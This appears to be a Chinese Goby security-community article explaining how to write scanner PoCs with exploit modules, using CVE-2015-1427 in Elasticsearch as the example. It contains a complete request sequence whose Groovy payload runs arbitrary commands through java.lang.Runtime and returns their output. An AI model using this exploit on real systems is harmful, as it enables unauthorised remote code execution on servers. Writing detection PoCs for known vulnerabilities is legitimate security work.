> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/CSLP90gh5QoK8fQk8p41eg)

![](https://mmbiz.qpic.cn/mmbiz_gif/GGOWG0fficjLTMIjhRPrloPMpJ4nXfwsIjLDB23mjUrGc3G8Qwo770yYCQAnyVhPGKiaSgfVu0HKnfhT4v5hSWcQ/640?wx_fmt=gif)  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaicsiaJZBAP0aIgg4WYqGvbJVYIR8tDJIl8WTghSPLBj5f7YLv8mokhyQ/640?wx_fmt=png)

Goby 社区第 13 篇技术分享文章

全文共：3906 字   预计阅读时间：10 分钟

**前言：**Goby 已经上了某榜（滑稽）的 top10 了，足以证明 Goby 的实用性，众所周知 Goby 还分为内测版、超级内测版、红队专版等等，其中最强大的莫过于红队专版，但红队版的获取是严格限制的，当然也是有获取方法，这里分享如何通过编写 PoC 获取红队专版。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **01**  

 **准备环境**

Goby 为 PoC 编写提交测试方便发布了... 姑且叫 PoC 版。PoC 版主要功能为登录后，可以在线提交 PoC，无需再提交到邮箱。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaM52Bxb7v3so8ouH5bb1icJxscCeB65icC3E2vqDvia8rt0AggLqwGebicw/640?wx_fmt=png)

然后还有两个连接，一个是《Goby 漏洞编写指南》：

https://github.com/gobysec/Goby/wiki/Vulnerability-writing-guide

还有《Goby 已录漏洞列表》防止 PoC 撞车：

https://shimo.im/sheets/hcoIpikMzpsVKgaC/aojnO/

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **02**

**第一个 Goby 的 PoC  
**

**2.1 简单的 PoC 制作**

实际上主要用到的功能在这里：

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaBWwEKDZSxQvXDSbPibPaiaotT9iaH6Qed26vaKZ2yxvbrA1KBYjMom9aQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaoVJ6894SB2LKzASDbTxE8E5s1NtFNlicMTLf6kfJrmofSEVLK7ia3ia4Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaibpDSSqS6ICCmJNgVDjicicNFvA75rJJfGfpHvCib9725MwadgnDIxcPIA/640?wx_fmt=png)

上图就能看到自定义 PoC 的界面样子了，具体填写的信息和填写标准参考上述的《Goby 漏洞编写指南》，里边有命名规则等详细解释和参考，然后就是 Requests 的 Response 处理，Goby 提供了 “测试” 功能可直接通过图形化界面自定义自己的 Requests。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiarc8XOMpPIJ0NfEGicDDFibcibWeTcM6ubL9apIibPWwydSztxzBEEMWfBg/640?wx_fmt=png)

这里以 CVE-2015-1427 为例，再完整的 RCE 中一共需要发送两次 Requests。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiar3mL2UBgl32WGrNnRCl5mJuYtxNLhYukO8ibwFqmKCzh1hypEFDVuicw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaWmraDEdFsdu34zUy5MRzNQh8hwMTNU9B22EZbGiczIicoemWM0AThdlA/640?wx_fmt=png)

然后 Goby 的 PoC 编辑界面提供了可选的单个或多个 Requests，也提供了 AND 和 OR 可选的发包逻辑，方便发送多个 Requests 的自定义

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaenmqibUrYlODxDqWMib6sjfWfqXSef6ts11WHklZvowJJGt2EhEvuMYQ/640?wx_fmt=png)

之后的 “响应测试” 可对 Response 进行判断可选有返回状态码，Header 和 Body，大家按照自己需求点一点即可。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaj2pJibgJ2Xr7Cso08P7zEmBe2KibXX9xtdzvKichv8vglGJj9osQQmM0A/640?wx_fmt=png)

CVE-2015-1427 需要两个 Requests，再来一个即可，这里需要一个 RCE 返回结果的判断，对于轮子达人来说点一点就好制作很方便。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiatGSaRib0yaE1s0TxSiaY3pIUkr0EMm9rBnSvJjXSgKiapwfBwk02yaiaVQ/640?wx_fmt=png)

到这里两次 Requests 好了，最终的 RCE 判断也好了剩下就是测试 PoC 可用性了，上图所示右上角提供了 “单 ip 扫描” 直接测试。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPia2lNeIMnRjFHz0IFG68o6R0FKg55oTrMHWVuicIibrsvM0GIG5gWGrYTQ/640?wx_fmt=png)

在资产扫描完成的界面，输入 query 点击放大镜可以进行资产匹配，用来确定自己写的 query 可以正确匹配。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaQraHykIOPjU0ZKfPb6jHpto8511wXicE9cr72dicXP6fdhUzssUBibfFw/640?wx_fmt=png)

但是仅有一个存在漏洞和不存在漏洞的结果提示，这个查询界面并没有显示 Response，所有如果怀疑自己的 PoC 有问题还需要自己抓包去看，而且多次 Requests 时仅显示第一个 Requests（所以建议该功能有待完善），我再测试 PoC 时无奈一直在 Wireshark 抓包看的，比较麻烦。

再去扫描中测试一番，这里每次对 PoC 进行修改之后都需要重启 Goby（点左下角的重启也行）。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiapVW5rjwcYEnogZTvicibnZr1ECuFDQl0V8SKIDOZWgNFzkic7VjzxiblJQ/640?wx_fmt=png)

**2.2 不太简单的 PoC 中的 Exp**

你以为 PoC 做好了？没有，一半了，如开头图中所示需要三个带 Exp 的漏洞，所有自己的 PoC 必须要 Exp 功能，然后 Exp 功能还没有图形化点一点的界面，而《Goby 漏洞编写指南》中对 Exp 的制作也只有个例子，没看到详细解释（可能我没看全），但是有一个 TP 的 demo，通过这个 demo 我们也能照猫画虎做 Exp 了。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiauauALjWUUnLHWmUibuzDQmibAFS7fd7b554QPymubTAeDhSVd0tDjcUw/640?wx_fmt=png)

制作 Exp 需要开启图形中的验证接口，你会好奇上图所示的 “验证” 为什么我没有，需要去手动编辑 Exp 模块了。

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPia7KW6Bm5g9H3LrYY6bqk4gKvBCvXCm4WDwCCVia5fTB01WE6y833Q9JA/640?wx_fmt=png)

```
"ExpParams": [
    {
      "name": "cmd",
      "type": "input",
      "value": "whoami"
    }
  ]
```

```
"ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/website/blog/",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/x-www-form-urlencoded"
        },
        "data_type": "text",
        "data": "{ \"name\": \"cve-2015-1427\" }"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "201",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody"
      ]
    },
    {
      "Request": {
        "method": "POST",
        "uri": "/_search?pretty",
        "follow_redirect": true,
        "header": {
          "Accept-Encoding": "gzip, deflate",
          "Accept": "*/*",
          "Connection": "close",
          "Accept-Language": "en",
          "Content-Type": "application/text"
        },
        "data_type": "text",
        "data": "{\"size\":1, \"script_fields\": {\"lupin\":{\"lang\":\"groovy\",\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"{{{cmd}}}\\\").getText()\"}}}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "460f7ccb583e25e09c0fe100a2c9e90d",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody|regex|(?s)\"lupin\" : \\[ \"(.*)\" \\]"
      ]
    }
  ]
```

```
"ExploitSteps": [
    "AND",
    {
      "Request": {xxxxxx},
      "ResponseTest": {xxxxxx},
      "SetVariable": [xxxxxx]
    },
    {
      "Request": {xxxxxx},
      "ResponseTest": {xxxxxx},
      "SetVariable": [xxxxxx]
    }
  ]
```

```
"SetVariable": [
        "output|lastbody"
      ]
```

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaEnlHnhySfTzpGylGURI0L1ibLb0c3ukICTfZ2V6JvnLa04OHHNFVSJA/640?wx_fmt=png)

现在为止 GUI 中已经开启 Exp 了，但实际还没有 “验证” 功能，需要再回到 “编辑器” 中编写“验证功能”，找到 json 中的 ExploitSteps 默认值为 null，继续以 CVE-2015-1427 为例需要两次 Requests 修改为：

```
"SetVariable": [
        "output|lastbody|regex|(?s)\"lupin\" : \\[ \"(.*)\" \\]"
      ]
```

```
可以看到上述json中 Requests 和PoC中的ScanSteps的Requests 是一致的，就不难理解是同样的发包，只不过一个在ScanSteps一个是ExploitSteps，现在应该也就大概理解这个json的大致功能了，上边看着乱简化一下：
```

```
"ExploitSteps": [
    "AND",
    {
      "Request": {xxxxxx},
      "ResponseTest": {xxxxxx},
      "SetVariable": [xxxxxx]
    },
    {
      "Request": {xxxxxx},
      "ResponseTest": {xxxxxx},
      "SetVariable": [xxxxxx]
    }
  ]
```

```
到这里应该都指知道Requests用来发包，ResponseTest用来判断是否满足判断SetVariable则会在“验证”功能中回显Body。
```

```
我在看官方提供的Exp demo中发现TP的RCE去掉了ResponseTest，我也跟着试，结果只发送第一个Requests不发第二个，后续找@go0p发现是去掉了ResponseTest的锅。
```

```
最后控制一下RCE的回显，TP的demo中SetVariable写的是:
```

```
"SetVariable": [
        "output|lastbody"
      ]
```

```
这里的效果就是显示整个Body。
```

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaibTicNWuybibic9VD9z3WEAicIibIm8d4JPPWrg5iaCGMjmw0LoHAkU1UV9PA/640?wx_fmt=png)

```
看起来比较凌乱，不过SetVariable中也有过滤可用，例如regex去正则。
```

```
"SetVariable": [
        "output|lastbody|regex|(?s)\"lupin\" : \\[ \"(.*)\" \\]"
      ]
```

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiaoEc6S6UoXasxCZ52yhiayMJQckEDu3QatvQl39OmsUfuD9reINF8Ffw/640?wx_fmt=png)

```
到这里一个带Exp的PoC就制作好了，如果你觉得PoC逻辑编写没为题但又怎么都不成功就只能反复测试反复抓包了，找你的wireshark好帮手，慢慢测慢慢排，最终完整的PoC一定出的来。
```

> 上述的 PoC 完整例子在：https://github.com/zhzyker/Goby-PoC

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWElvrR0XQbqBDCHC68DicU6TwYLR54jEJE3rqy2icwicrV85dICfKrJsOQ/640?wx_fmt=png) **03**

**总结**

```
仅需编写三个带Exp的PoC即可领取Goby红队版！
```

```
小手半天抖一抖~
```

```
红队专版拿到手~
```

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKKricm8pzglXxuNnHmMbTPiabH8AYVybUibjdFqI3aQPyhhM4VtvGQn6RqpnleDwpQw7oeEsUYL8wmA/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKzq4TFicia2yUjianoH80KtrWfiaAtUngV8rgLh0bIibv9SumD1Y9ZmphGxK9lKiakkOWDp2gRsLjZInPg/640?wx_fmt=png)

**最新 Goby 使用技巧分享****：**

[• limb0 | 如何利用 Goby 获得多个地市 hvv 一等奖](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247491982&idx=1&sn=32af9069f2cc46ca4e976949bf59fb9b&chksm=eb840a2edcf38338aa47e684a294e3adb420fa79c1fbabe890344ab6d04f1e9fbb71a6d1824e&scene=21#wechat_redirect)  

[• 梦幻的彼岸 | Apache Tomcat 样例目录 session](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247492779&idx=1&sn=ad21953a1500e9faf108d35af59670d0&chksm=eb840f0bdcf3861da0ca6127182c49fe861d222ee4bf76207c9f881b4f212e0ca147b88fda98&scene=21#wechat_redirect)

[• kio | 如何利用 Goby 将防守单位打出局](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247493346&idx=1&sn=15aee6f7fb0730d102f2a99544be2993&chksm=eb840d42dcf384545f637905e7f875d32a129f54aa3fdef1892abba961a360b9a20fb5f5ffaf&scene=21#wechat_redirect)

[• bytesec | 从致远 OA-ajax.do 漏洞复现到利用](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247493690&idx=1&sn=b1ddaa1b3ca1004cf3bf336f8f4c2eb4&chksm=eb84039adcf38a8c012a29829cda76766bb925bd6a0d80687bc43b597f70f64046158fe0ca41&scene=21#wechat_redirect)

[• zzlyzq | 利用 Goby 发现企业云网络中的安全隐患](http://mp.weixin.qq.com/s?__biz=MzI4MzcwNTAzOQ==&mid=2247495973&idx=1&sn=45fbd8de0e1377d2912d5f9c808bbb03&chksm=eb841a85dcf393933fcbc6e5d718c91355ad274cd0ae1ce634e6b4ab94037fa1218fa5b4f4bb&scene=21#wechat_redirect)

更多 >>  打野手册

如果表哥 / 表姐也想把自己上交给社区（Goby 介绍 / 扫描 / 口令爆破 / 漏洞利用 / 插件开发 / PoC 编写等文章均可）![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjKEYyZh6YMicl2K5TDD26xJiaXMwReBoEFfWYSRkOGBMzrZ3VpbKu1DtFLprCibCrsuX3QlGJLMG79jg/640?wx_fmt=png)，欢迎投稿到我们公众号，超级内测版等着你们~~~

![](https://mmbiz.qpic.cn/mmbiz_png/GGOWG0fficjIaeEP9ZkuBRxk7BicMlGFoEZnkVh7ib8GaBYw8lrh8SqACnTUZXlXclC9ZRfOFuvB3gTWHOPvH8icyg/640?wx_fmt=png)